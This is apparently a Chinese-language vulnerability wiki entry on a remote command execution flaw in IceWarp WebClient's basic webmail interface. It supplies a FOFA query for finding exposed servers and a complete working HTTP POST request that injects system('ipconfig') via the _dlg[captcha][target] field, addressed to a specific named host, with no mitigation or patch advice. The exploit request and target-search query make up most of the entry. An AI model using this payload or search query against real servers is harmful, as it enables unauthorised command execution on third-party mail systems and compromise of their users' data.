# IceWarp WebClient basic 远程命令执行漏洞

## 漏洞描述

IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请求即可远程命令执行

## 漏洞影响

> [!NOTE]
>
> IceWarp WebClient 

## FOFA

> [!NOTE]
>
> app="IceWarp-公司产品"

## 漏洞复现

登录页面如下

![image-20210616110615816](http://wikioss.peiqi.tech/vuln/image-20210616110615816.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞请求包为

```
POST /webmail/basic/ HTTP/1.1
Host: sd.sahadharawat.com
Content-Type: application/x-www-form-urlencoded
Cookie: use_cookies=1
Content-Length: 43

_dlg[captcha][target]=system(\'ipconfig\')\
```

![image-20210616110911190](http://wikioss.peiqi.tech/vuln/image-20210616110911190.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)